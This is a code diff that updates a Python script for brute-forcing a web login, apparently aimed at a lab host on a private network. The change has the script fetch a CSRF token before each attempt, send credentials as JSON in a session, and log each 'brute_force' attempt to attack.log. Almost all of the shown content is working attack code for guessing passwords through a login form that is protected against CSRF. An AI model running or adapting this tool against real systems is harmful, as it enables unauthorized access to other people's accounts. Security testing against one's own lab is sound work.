@@ -1,7 +1,9 @@
-import requests
 import datetime
 import os
 import time
+from urllib.parse import urljoin
+
+import requests
 
 try:
     from dotenv import load_dotenv
@@ -11,7 +13,9 @@ except ImportError:
 if load_dotenv:
     load_dotenv()
 
-url = os.environ.get("TARGET_LOGIN_URL", "http://192.168.2.100:5000/login")
+base_url = os.environ.get("TARGET_BASE_URL", "http://192.168.2.100:5000")
+login_url = os.environ.get("TARGET_LOGIN_URL", urljoin(base_url.rstrip("/") + "/", "login"))
+csrf_url = os.environ.get("TARGET_CSRF_URL", urljoin(base_url.rstrip("/") + "/", "csrf-token"))
 log_file = os.environ.get("ATTACK_LOG_FILE", "attack.log")
 
 payloads = [
@@ -31,29 +35,49 @@ def write_log(message: str) -> None:
     with open(log_file, "a", encoding="utf-8") as f:
         f.write(message + "\n")
 
-for i, data in enumerate(payloads, start=1):
-    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-    try:
-        res = requests.post(
-            url,
-            data=data,
-            timeout=5
-        )
+def get_csrf_token(session: requests.Session) -> str:
+    response = session.get(csrf_url, timeout=5)
+    response.raise_for_status()
+    token = response.json().get("csrf_token")
+    if not token:
+        raise ValueError("csrf_token missing from response")
+    return token
 
-        log_line = (
-            f"{now} | brute_force | attempt={i} | "
-            f"user={data['username']} | pw_length={len(data['password'])} | status={res.status_code}"
-        )
-        print(log_line)
-        write_log(log_line)
 
-    except requests.RequestException as e:
-        log_line = (
-            f"{now} | brute_force | attempt={i} | "
-            f"user={data['username']} | pw_length={len(data['password'])} | error={e}"
-        )
-        print(log_line)
-        write_log(log_line)
+with requests.Session() as session:
+    for i, credentials in enumerate(payloads, start=1):
+        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        username = credentials["username"]
+        password = credentials["password"]
 
-    time.sleep(0.5)
+        try:
+            csrf_token = get_csrf_token(session)
+            login_payload = {
+                "username": username,
+                "password": password,
+                "csrf_token": csrf_token,
+            }
+            res = session.post(
+                login_url,
+                json=login_payload,
+                headers={"X-CSRF-Token": csrf_token},
+                timeout=5,
+            )
+
+            log_line = (
+                f"{now} | brute_force | attempt={i} | "
+                f"user={username} | pw_length={len(password)} | status={res.status_code}"
+            )
+            print(log_line)
+            write_log(log_line)
+
+        except (requests.RequestException, ValueError) as e:
+            log_line = (
+                f"{now} | brute_force | attempt={i} | "
+                f"user={username} | pw_length={len(password)} | error={e}"
+            )
+            print(log_line)
+            write_log(log_line)
+
+        time.sleep(0.5)
